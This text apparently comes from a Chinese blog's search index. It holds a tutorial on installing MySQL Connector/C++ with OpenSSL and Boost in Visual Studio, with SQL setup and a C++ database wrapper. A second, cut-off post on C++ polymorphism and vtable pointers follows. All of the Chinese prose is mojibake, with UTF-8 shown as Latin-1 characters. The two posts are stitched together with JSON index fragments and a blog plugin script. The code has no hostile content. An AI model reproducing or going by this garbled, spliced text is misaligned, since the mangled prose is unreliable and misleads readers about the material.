ä»‹ç»ç®€ä»‹ MySQL Connector/C++ æ˜¯ä¸€ä¸ª MySQL æ•°æ®åº“è¿æ¥å™¨ï¼ŒåŒ…å«äº† C++ è¿æ¥ MySQL æœåŠ¡å™¨æ‰€éœ€çš„å¤´æ–‡ä»¶å’Œåº“æ–‡ä»¶ï¼Œå¯ç”¨äºå¼€å‘åŸºäº JDBC çš„ C++ åº”ç”¨ç¨‹åºã€‚ å¼€å‘ä¼˜åŠ¿ ä¸ MySQL å®¢æˆ·ç«¯åº“æä¾›çš„ C è¯­è¨€ API ç›¸æ¯”ï¼ŒMySQL Connector/C++ ä¸º C++ ç”¨æˆ·æä¾›ä»¥ä¸‹å¥½å¤„ï¼š çº¯ C++ å¼€å‘çš„ä¾¿åˆ© æ”¯æŒåŸºäº JDBC 4.0 çš„ API æ”¯æŒé¢å‘å¯¹è±¡çš„ç¼–ç¨‹èŒƒå¼ å‡å°‘é¡¹ç›®çš„å¼€å‘æ—¶é—´ å¯æ ¹æ®è¦æ±‚è·å¾—å•†ä¸šè®¸å¯è¯ æ ¹æ® GPL è·å¾—è®¸å¯ï¼Œä½† FLOSS è®¸å¯é™¤å¤– åˆ†å‘æ–¹å¼ MySQL Connector/C++ æœ‰äºŒè¿›åˆ¶æ–‡ä»¶å’Œæºä»£ç åˆ†å‘ç‰ˆï¼Œå¹¶ä»¥ç‰¹å®šäºå¹³å°çš„æ‰“åŒ…æ ¼å¼æä¾›ï¼š äºŒè¿›åˆ¶åˆ†å‘ç‰ˆå¯ç”¨äº Windowsã€Linuxã€Unix å’Œç±» Unix å¹³å° æºä»£ç åˆ†å‘ç‰ˆå¯ä½œä¸ºå‹ç¼©çš„ tar æ–‡ä»¶æˆ– zip æ–‡ä»¶æä¾›ï¼Œå¹¶å¯åœ¨ä»»ä½•å—æ”¯æŒçš„å¹³å°ä¸Šä½¿ç”¨ æºä»£ç å­˜å‚¨åº“ä½¿ç”¨ Git å­˜å‚¨ï¼Œå¯åœ¨ GitHub ä¸Šè·å¾— ä¸ JDBC çš„å…¼å®¹æ€§ MySQL Connector/C++ ä¸ JDBC 4.0 API å…¼å®¹ï¼Œæ²¡æœ‰å®ç°æ•´ä¸ª JDBC 4.0 APIï¼Œä½†å…·æœ‰ä»¥ä¸‹ç±»ï¼šConnectionã€DatabaseMetaDataã€Driverã€PreparedStatementã€ResultSetã€ResultSetMetaDataã€Savepointã€Statementã€‚JDBC 4.0 API ä¸ºåˆšæ‰æåˆ°çš„ç±»å®šä¹‰äº†å¤§çº¦ 450 ä¸ªæ–¹æ³•ï¼ŒMySQL Connector/C++ å®ç°äº†å…¶ä¸­çš„å¤§çº¦ 80%ã€‚ æ”¯æŒçš„å¹³å°å’Œå…ˆå†³æ¡ä»¶ å¯¹äº MySQL Connector/C++ 1.1.11 åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå•†ä¸šå’Œç¤¾åŒºå‘è¡Œç‰ˆéœ€è¦ä¾èµ– Visual C++ Redistributable for Visual Studio 2015 æ‰èƒ½åœ¨ Windows å¹³å°ä¸Šè¿è¡Œã€‚ä» MySQL Connector/C++ 1.1.10 å¼€å§‹ï¼Œç¤¾åŒºï¼ˆéå•†ä¸šï¼‰å‘è¡Œç‰ˆéœ€è¦ä¾èµ–é€‚ç”¨äº Visual Studio 2013 çš„ Visual C++ Redistributableã€‚å¯åœ¨ Microsoft ä¸‹è½½ä¸­å¿ƒè·å– Redistributable çš„å®‰è£…åŒ…ï¼Œå¹¶åœ¨å®‰è£… MySQL Connector/C++ ä¹‹å‰å®‰è£…å®ƒã€‚ è¦è¿è¡Œå¸¦ MySQL Connector/C++ çš„åº”ç”¨ç¨‹åºï¼Œéœ€è¦ MySQL 5.6 æˆ–æ›´é«˜ç‰ˆæœ¬çš„æ•°æ®åº“æœåŠ¡å™¨ è¦æ„å»ºå¸¦ MySQL Connector/C++ çš„åº”ç”¨ç¨‹åº åœ¨ Windows ç³»ç»Ÿä¸Šï¼Œéœ€è¦ Microsoft Visual Studio 2015 è¦ä»æºä»£ç æ„å»º MySQL Connector/C++ è‡ªèº« åœ¨ Windows ç³»ç»Ÿä¸Šï¼Œéœ€è¦ Microsoft Visual Studio 2015 Building Connector/C++ éœ€è¦ MySQL 5.7ï¼ˆ5.7.9 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰æˆ– MySQL 8.0ï¼ˆ8.0.11 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰çš„å®¢æˆ·ç«¯åº“ å‡†å¤‡å·¥ä½œOpenSSL å®‰è£…å®‰è£… OpenSSLåœ¨ OpenSSL å®˜ç½‘ ä¸‹è½½ Win64 OpenSSL v1.1.1L ç‰ˆæœ¬çš„å®‰è£…åŒ…ï¼Œä¸‹è½½å®Œæˆåç›´æ¥å®‰è£…ï¼Œæ¯ä¸€æ­¥å®‰è£…æ­¥éª¤é€‰æ‹©é»˜è®¤é€‰é¡¹å³å¯ã€‚OpenSSL é»˜è®¤çš„å®‰è£…è·¯å¾„æ˜¯ C:\\Program Files\\OpenSSL-Win64ã€‚ VS é¡¹ç›®æ·»åŠ  OpenSSL çš„ åº“æ–‡ä»¶OpenSSL å®‰è£…å®Œæˆä¹‹åï¼Œå°†å…¶å®‰è£…ç›®å½•ä¸‹çš„ bin æ–‡ä»¶å¤¹ä¸­çš„ libssl-1_1-x64.dll å’Œ libcrypto-1_1-x64.dll åº“æ–‡ä»¶æ‹·è´åˆ° VS é¡¹ç›®çš„ç›®å½•ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š VS é¡¹ç›®å¼•å…¥ OpenSSL çš„ å¤´æ–‡ä»¶å³é”®é¡¹ç›®ï¼Œé€‰æ‹© å±æ€§ï¼Œå¯¼èˆªåˆ° é…ç½®å±æ€§ -&gt; C/C++ -&gt; å¸¸è§„ -&gt; é™„åŠ åŒ…å«ç›®å½•ï¼Œæ·»åŠ  OpenSSL å¤´æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è·¯å¾„ï¼ˆå¦‚ C:\\Program Files\\OpenSSL-Win64\\includeï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š MySQL Connector/C++ å®‰è£…å®‰è£… MySQL Connector/C++åœ¨ MySQL å®˜ç½‘ ä¸Šä¸‹è½½ 1.1.13 ç‰ˆæœ¬çš„ MySQL Connector/C++ï¼Œä¸‹è½½å®Œæˆåç›´æ¥å®‰è£…å³å¯ã€‚è‹¥å·²ç»æœ¬åœ°å·²ç»å®‰è£…è¿‡ MySQL Serverï¼Œåˆ™ä¸å†éœ€è¦æ‰‹åŠ¨å®‰è£… MySQL Connector/C++ï¼Œå› ä¸ºé»˜è®¤å·²ç»å®‰è£…è¿‡äº†ï¼Œä½†éœ€è¦ç•™æ„ MySQL Connector/C++ ä¸ MySQL çš„ç‰ˆæœ¬æ˜¯å¦åŒ¹é… ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒMySQL Connector/C++ æ”¯æŒå¤šä¸ªç‰ˆæœ¬å…±å­˜ï¼ˆåŒæ—¶å®‰è£…ä¸åŒçš„ç‰ˆæœ¬ï¼‰ï¼Œå…¶é»˜è®¤çš„å®‰è£…è·¯å¾„ä¸º C:\\Program Files\\MySQL\\Connector.C++ 1.xã€‚ VS é¡¹ç›®æ·»åŠ  MySQL Connector/C++ çš„ åº“æ–‡ä»¶MySQL Connector/C++ å®‰è£…å®Œæˆåï¼Œå°†å…¶å®‰è£…ç›®å½•ä¸‹ lib/opt æ–‡ä»¶å¤¹ä¸­çš„ mysqlcppconn.dll ä¸ mysqlcppconn.lib åº“æ–‡ä»¶æ‹·è´åˆ° VS é¡¹ç›®çš„ç›®å½•ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š VS é¡¹ç›®å¼•å…¥ MySQL Connector/C++ çš„å¤´æ–‡ä»¶å³é”®é¡¹ç›®ï¼Œé€‰æ‹© å±æ€§ï¼Œå¯¼èˆªåˆ° é…ç½®å±æ€§ -&gt; C/C++ -&gt; å¸¸è§„ -&gt; é™„åŠ åŒ…å«ç›®å½•ï¼Œæ·»åŠ  MySQL Connector/C++ å¤´æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è·¯å¾„ï¼ˆå¦‚ C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13\\includeï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š C++ è¿æ¥ MySQL çš„å®æˆ˜æ¡ˆä¾‹MySQL æ•°æ®åº“åˆå§‹åŒ–123456789101112131415161718192021222324252627282930-- ------------------------------ åˆ›å»ºæ•°æ®åº“-- ----------------------------DROP DATABASE IF EXISTS `t_shop`;CREATE DATABASE `t_shop` DEFAULT CHARACTER SET UTF8;-- ------------------------------ åˆ‡æ¢æ•°æ®åº“-- ----------------------------USE `t_shop`;-- ------------------------------ åˆ›å»ºæ•°æ®åº“è¡¨-- ----------------------------DROP TABLE IF EXISTS `properties`;CREATE TABLE `properties` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` varchar(200) DEFAULT NULL, `VALUE` varchar(200) DEFAULT NULL, `REMARK` varchar(200) DEFAULT NULL, PRIMARY KEY (`ID`) USING BTREE, UNIQUE KEY `key_unique_index` (`KEY`)) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=UTF8 ROW_FORMAT=DYNAMIC;-- ------------------------------ å¾€æ•°æ®åº“è¡¨æ’å…¥æ•°æ®-- ----------------------------INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_price\', \'30.5\', \'é™åˆ¶ä»·æ ¼\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_number\', \'430\', \'é™åˆ¶æ•°é‡\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_balance\', \'929.32\', \'é™åˆ¶ä½™é¢\'); C++ è¿æ¥ MySQL çš„ä»£ç  mysqldb.h 12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;mysql_connection.h&gt;#include &lt;cppconn/driver.h&gt;#include &lt;cppconn/exception.h&gt;#include &lt;cppconn/resultset.h&gt;#include &lt;cppconn/statement.h&gt;#include &lt;cppconn/prepared_statement.h&gt;using namespace std;using namespace sql;// MySQLæ•°æ®åº“æ“ä½œç±»class MysqlDB {public: MysqlDB(const string host, const string username, const string password, const string database); ~MysqlDB();public: bool Execute(const char* sql); int ExecuteUpdate(const char* sql); unique_ptr&lt;ResultSet&gt; Query(const char* query, const vector&lt;string&gt; parameters);private: string host; string username; string password; string database; Driver* driver; unique_ptr&lt;Connection&gt; connection; // æ™ºèƒ½æŒ‡é’ˆ}; mysqldb.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include "mysqldb.h"// æ„é€ å‡½æ•°MysqlDB::MysqlDB(const string host, const string username, const string password, const string database) { // åˆå§‹åŒ–MySQLçš„è¿æ¥ä¿¡æ¯ this-&gt;host = host; this-&gt;username = username; this-&gt;password = password; this-&gt;database = database; try { // åŠ è½½MySQLé©±åŠ¨ this-&gt;driver = get_driver_instance(); if (!this-&gt;driver) { throw "failed to load mysql driver"; } // è¿æ¥MySQLå®ä¾‹ this-&gt;connection.reset(driver-&gt;connect(this-&gt;host.c_str(), this-&gt;username.c_str(), this-&gt;password.c_str())); if (!this-&gt;connection) { throw "failed to connect mysql server"; } else { // è®¾ç½®é»˜è®¤æ•°æ®åº“ this-&gt;connection-&gt;setSchema(this-&gt;database.c_str()); } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; };}// ææ„å‡½æ•°MysqlDB::~MysqlDB() {}// ç”¨äºæ‰§è¡Œä»»ä½• SQL è¯­å¥ï¼Œè¿”å›ä¸€ä¸ª bool å€¼ï¼Œè¡¨æ˜æ‰§è¡Œè¯¥ SQL è¯­å¥æ˜¯å¦è¿”å›äº† ResultSet// å¦‚æœæ‰§è¡Œåç¬¬ä¸€ä¸ªç»“æœæ˜¯ ResultSetï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falsebool MysqlDB::Execute(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;execute(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return false;}// ç”¨äºæ‰§è¡Œ INSERTã€UPDATE æˆ– DELETE è¯­å¥ä»¥åŠ SQL DDLï¼ˆæ•°æ®å®šä¹‰è¯­è¨€ï¼‰è¯­å¥ï¼Œä¾‹å¦‚ CREATE TABLE å’Œ DROP TABLE// å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´æ•°ï¼ŒæŒ‡ç¤ºå—å½±å“çš„è¡Œæ•°ï¼Œå¯¹äº CREATE TABLE æˆ– DROP TABLE ç­‰ä¸æ“ä½œè¡Œçš„è¯­å¥ï¼Œè¿”å›å€¼æ€»ä¸ºé›¶int MysqlDB::ExecuteUpdate(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;executeUpdate(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return 0;}// åŸºäº SQL çš„é¢„ç¼–è¯‘æœºåˆ¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢å•ä¸ªç»“æœé›†ï¼ˆResultSetï¼‰çš„ SQL è¯­å¥ï¼Œä¾‹å¦‚ SELECT è¯­å¥unique_ptr&lt;ResultSet&gt; MysqlDB::Query(const char* sql, const vector&lt;string&gt; parameters) { unique_ptr&lt;ResultSet&gt; resultSet = nullptr; try { if (this-&gt;connection) { int index = 0; unique_ptr&lt;PreparedStatement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;prepareStatement(sql)); if (statement) { for (auto iterator = parameters.cbegin(); iterator != parameters.cend(); iterator++) { index++; statement-&gt;setString(index, (*iterator).c_str()); } resultSet.reset(statement-&gt;executeQuery()); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return resultSet;} main.cpp 12345678910111213141516171819202122#include &lt;iostream&gt;#include "mysqldb.h"using namespace std;int main() { unique_ptr&lt;MysqlDB&gt; db(new MysqlDB("tcp://127.0.0.1:3306", "root", "123456", "t_shop")); string querySql = "select * from properties where `KEY` = ?"; unique_ptr&lt;ResultSet&gt; result = db-&gt;Query(querySql.c_str(), { "test_limit_price" }); if (result) { cout &lt;&lt; "Query: " &lt;&lt; querySql &lt;&lt; endl; while (result-&gt;next()) { cout &lt;&lt; result-&gt;getInt("ID") &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("KEY").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("VALUE").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("REMARK").c_str() &lt;&lt; " | "; cout &lt;&lt; endl; } } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12Query: select * from properties where `KEY` = ?27 | test_limit_price | 30.5 | é™åˆ¶ä»·æ ¼ | å¸¸è§é—®é¢˜ç¼ºå¤± Boost åº“é”™è¯¯ä¿¡æ¯ï¼š é¡¹ç›®æ‰§è¡Œç¼–è¯‘æ“ä½œåï¼ŒVS å‡ºç°ä¸‹è¿°é”™è¯¯ä¿¡æ¯ï¼Œè¿™æ˜¯æœ¬åœ°ç¼ºå¤± boost åº“å¯¼è‡´çš„ã€‚1fatal error C1083: æ— æ³•æ‰“å¼€åŒ…æ‹¬æ–‡ä»¶: â€œboost/shared_ptr.hppâ€: No such file or directory è§£å†³æ–¹æ³•ï¼š a) åœ¨ Boost å®˜ç½‘ ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ Boostï¼Œå¹¶è§£å‹åˆ°æœ¬åœ°ç£ç›˜ï¼Œä¾‹å¦‚è§£å‹è·¯å¾„ä¸ºï¼šC:\\Program Files\\boost_1_77_0 b) å³é”®é¡¹ç›®ï¼Œé€‰æ‹© å±æ€§ï¼Œå¯¼èˆªåˆ° é…ç½®å±æ€§ -&gt; C/C++ -&gt; å¸¸è§„ -&gt; é™„åŠ åŒ…å«ç›®å½•ï¼Œæ·»åŠ  Boost çš„å®‰è£…è·¯å¾„ï¼ˆå¦‚ C:\\Program Files\\boost_1_77_0ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º c) é‡æ–°æ‰§è¡Œé¡¹ç›®çš„ç¼–è¯‘æ“ä½œ ç¼ºå¤± libssl-1_1-64.dll æ–‡ä»¶é”™è¯¯ä¿¡æ¯ï¼š é¡¹ç›®è¿è¡Œåï¼Œç³»ç»Ÿå¼¹çª—æç¤ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ã€‚1ç”±äºæ‰¾ä¸åˆ° libssl-1_1-64.dllï¼Œæ— æ³•ç»§ç»­æ‰§è¡Œä»£ç ã€‚é‡æ–°å®‰è£…ç¨‹åºå¯èƒ½ä¼šè§£å†³æ­¤é—®é¢˜ã€‚ è§£å†³æ–¹æ³•ï¼š å®‰è£… OpenSSLï¼Œå¹¶æ‹·è´ libssl-1_1-64.dll åº“æ–‡ä»¶åˆ° VS é¡¹ç›®çš„ç›®å½•ä¸­ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒä¸Šé¢çš„ OpenSSL - å®‰è£… æ•™ç¨‹ã€‚ ç¼ºå¤± libcrypto-1_1-x64.dll æ–‡ä»¶é”™è¯¯ä¿¡æ¯ï¼š é¡¹ç›®è¿è¡Œåï¼Œç³»ç»Ÿå¼¹çª—æç¤ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ã€‚1ç”±äºæ‰¾ä¸åˆ° libcrypto-1_1-x64.dllï¼Œæ— æ³•ç»§ç»­æ‰§è¡Œä»£ç ã€‚é‡æ–°å®‰è£…ç¨‹åºå¯èƒ½ä¼šè§£å†³æ­¤é—®é¢˜ã€‚ è§£å†³æ–¹æ³•ï¼š å®‰è£… OpenSSLï¼Œå¹¶æ‹·è´ libcrypto-1_1-x64.dll åº“æ–‡ä»¶åˆ° VS é¡¹ç›®çš„ç›®å½•ä¸­ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒä¸Šé¢çš„ OpenSSL - å®‰è£… æ•™ç¨‹ã€‚ å‚è€ƒæ–‡æ¡£ mysql-connector-demo MySQL Connector/C++ å®˜æ–¹æ–‡æ¡£ MySQL Connector/C++ Github ä»“åº“ MySQL Connector/C++ å®˜æ–¹ API ä½¿ç”¨æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹ä¹",url:"/posts/f1a16291.html",text:'å¤šæ€çš„åŸç†å¤šæ€çš„å®ç°åŸç† å½“ç±»ä¸­å£°æ˜äº†è™šå‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç±»ä¸­ç”Ÿæˆä¸€ä¸ªè™šå‡½æ•°è¡¨ è™šå‡½æ•°è¡¨æ˜¯ä¸€ä¸ªå­˜å‚¨ç±»æˆå‘˜å‡½æ•°æŒ‡é’ˆçš„æ•°æ®ç»“æ„ è™šå‡½æ•°è¡¨æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆå’Œç»´æŠ¤çš„ è™šå‡½æ•°ï¼ˆvirtualï¼‰ä¼šè¢«ç¼–è¯‘å™¨æ”¾å…¥è™šå‡½æ•°è¡¨ä¸­ å½“å­˜åœ¨è™šå‡½æ•°æ—¶ï¼Œæ¯ä¸ªå¯¹è±¡ä¸­éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘è™šå‡½æ•°è¡¨çš„æŒ‡é’ˆï¼ˆC++ ç¼–è¯‘å™¨ç»™çˆ¶ç±»å¯¹è±¡ã€å­ç±»å¯¹è±¡æå‰è®¾ç½®äº† VPTR è™šå‡½æ•°è¡¨æŒ‡é’ˆï¼Œå› æ­¤ C++ ç¼–è¯‘å™¨ä¸éœ€è¦åŒºåˆ†å­ç±»å¯¹è±¡æˆ–è€…çˆ¶ç±»å¯¹è±¡ï¼Œåªéœ€è¦åœ¨ base æŒ‡é’ˆä¸­ï¼Œæ‰¾ VPTR æŒ‡é’ˆå³å¯ï¼‰ VPTR è™šå‡½æ•°è¡¨æŒ‡é’ˆä¸€èˆ¬ä½œä¸ºç±»å¯¹è±¡çš„ç¬¬ä¸€ä¸ªæˆå‘˜ å¤šæ€çš„å®ç°åŸç†å›¾è§£ a) å¤šæ€å®ç°åŸç†çš„å›¾è§£ å¦‚å›¾ æ‰€ç¤º b) é€šè¿‡ VPTR è™šå‡½æ•°è¡¨æŒ‡é’ˆè°ƒç”¨é‡å†™å‡½æ•°çš„è¿‡ç¨‹æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶è¿›è¡Œçš„ï¼Œå› æ­¤éœ€è¦é€šè¿‡å¯»å€æ“ä½œæ‰èƒ½ç¡®å®šçœŸæ­£åº”è¯¥è°ƒç”¨çš„å‡½æ•°ï¼Œè€Œæ™®é€šæˆå‘˜å‡½æ•°æ˜¯åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šäº†è°ƒç”¨çš„å‡½æ•° c) åœ¨æ•ˆç‡ä¸Šï¼Œè™šå‡½æ•°çš„æ•ˆç‡è¦ä½å¾ˆå¤šï¼Œå› æ­¤å‡ºäºæ•ˆç‡è€ƒè™‘ï¼Œæ²¡æœ‰å¿…è¦å°†æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½å£°æ˜ä¸ºè™šå‡½æ•°ï¼Œå³ä½¿ C++ ç¼–è¯‘å™¨å…è®¸è¿™ä¹ˆåš d) ç”±äºæœ‰äº†è™šå‡½æ•°è¡¨ï¼ŒC++ ç¼–è¯‘å™¨ä¸å†éœ€è¦çŸ¥é“æ˜¯å­ç±»å¯¹è±¡è¿˜æ˜¯çˆ¶ç±»å¯¹è±¡ï¼Œè¿™å¾€å¾€ä¼šç»™æˆ‘ä»¬é€ æˆä¸€ç§å‡è±¡ï¼šC++ ç¼–è¯‘å™¨èƒ½è¯†åˆ«å­ç±»å¯¹è±¡æˆ–è€…çˆ¶ç±»å¯¹è±¡ è¯æ˜ VPTR æŒ‡é’ˆçš„å­˜åœ¨12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent1 {public: Parent1(int a) { this-&gt;a = a; } // ä¸å£°æ˜è™šå‡½æ•° void print() { cout &lt;&lt; "I\'m parent1" &lt;&lt; endl; }private: int a;};class Parent2 {public: Parent2(int a) { this-&gt;a = a; } // å£°æ˜è™šå‡½æ•° virtual void print() { cout &lt;&lt; "I\'m parent2" &lt;&lt; endl; }private: int a;};int main() { // ç”±äºæŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼Œç”±äºåœ¨Parent2ç±»ä¸­å£°æ˜äº†è™šå‡½æ•°ï¼Œè‹¥Parent2ç±»é‡Œå­˜åœ¨VPTRæŒ‡é’ˆï¼Œé‚£ä¹ˆä¸‹é¢ä¸¤ä¸ªç±»çš„å¤§å°åº”è¯¥æ˜¯ä¸ä¸€æ ·çš„ cout &lt;&lt; "sizeof(Parent1): " &lt;&lt; sizeof(Parent1) &lt;&lt; endl; cout &lt;&lt; "sizeof(Parent2): " &lt;&lt; sizeof(Parent2) &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12sizeof(Parent1): 4sizeof(Parent2): 8 çˆ¶ç±»æŒ‡é’ˆå’Œå­ç±»æŒ‡é’ˆçš„æ­¥é•¿å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ a) æŒ‡é’ˆä¹Ÿåªä¸€ç§æ•°æ®ç±»å‹ï¼Œå¯¹ C++ ç±»å¯¹è±¡çš„æŒ‡é’ˆæ‰§è¡Œ ++ã€-- è¿ç®—ç¬¦ä»ç„¶æ˜¯åˆæ³•çš„ b) "å¤šæ€æ˜¯ç”¨çˆ¶ç±»çš„æŒ‡é’ˆæŒ‡å‘å­ç±»çš„å¯¹è±¡" å’Œ "çˆ¶ç±»æŒ‡é’ˆæ­¥é•¿çš„è‡ªåŠ ï¼ˆ++ï¼‰" æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„æ¦‚å¿µ c) å½“å­ç±»ç»§æ‰¿çˆ¶ç±»åï¼Œæ²¡æœ‰æ·»åŠ ä»»ä½•è‡ªå·±çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œé‚£ä¹ˆæ­¤æ—¶çˆ¶ç±»æŒ‡é’ˆå’Œå­ç±»æŒ‡é’ˆçš„æ­¥é•¿æ‰æ˜¯ä¸€æ ·çš„ d) æŒ‡é’ˆè¿ç®—æ˜¯æŒ‰ç…§æŒ‡é’ˆæ‰€æŒ‡çš„ç±»å‹è¿›è¡Œçš„ï¼Œçˆ¶ç±»æŒ‡é’ˆå’Œå­ç±»æŒ‡é’ˆçš„æ­¥é•¿å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸è¦ç”¨çˆ¶ç±»æŒ‡é’ˆè‡ªåŠ ï¼ˆ++ï¼‰ã€è‡ªå‡ï¼ˆ--ï¼‰çš„æ–¹å¼æ¥æ“ä½œå­ç±»çš„å¯¹è±¡æ•°ç»„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Parent{public: Parent(int a = 0) { this-&gt;a = a; } virtual void print() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};class Child : public Parent{public: Child(int b, int c) :Parent(0) { this-&gt;b = b; this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int b; int c;};int main(){ Parent* parent = NULL; Child* child = NULL; Child array[] = { Child(1, 2), Child(3,4), Child(5, 6) }; parent = array; child = array; // æŒ‡é’ˆè‡ªåŠ è¿ç®—åè¿è¡Œå¯èƒ½ä¼šå‡ºé”™ï¼Œè¿™é‡Œçˆ¶ç±»æŒ‡é’ˆå’Œå­ç±»æŒ‡é’ˆçš„æ­¥é•¿æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸è¦ç”¨çˆ¶ç±»æŒ‡é’ˆè‡ªåŠ ï¼ˆ`++`ï¼‰ã€è‡ªå‡ï¼ˆ`--`ï¼‰çš„æ–¹å¼æ¥æ“ä½œå­ç±»çš„å¯¹è±¡æ•°ç»„ parent++; child++; parent++; child++; return 0;} åœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œä¸èƒ½å®ç°å¤šæ€å­ç±»çš„ VPTR æŒ‡é’ˆæ˜¯åˆ†æ­¥å®Œæˆåˆå§‹åŒ–çš„ï¼Œå½“æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°æ—¶ï¼Œå­ç±» çš„ VPTR æŒ‡é’ˆæŒ‡å‘çˆ¶ç±»çš„è™šå‡½æ•°è¡¨ï¼Œå½“çˆ¶ç±»çš„æ„é€ å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œæ‰ä¼šæŠŠå­ç±»çš„ VPTR æŒ‡é’ˆæŒ‡å‘å­ç±»çš„è™šå‡½æ•°è¡¨ã€‚å› æ­¤ï¼Œåœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œä¸èƒ½å®ç°å¤šæ€ã€‚ a) åˆ†æå›¾è§£ å¦‚å›¾ æ‰€ç¤º b) å¯¹è±¡åœ¨åˆ›å»ºçš„æ—¶ï¼Œç”±ç¼–è¯‘å™¨å¯¹ VPTR 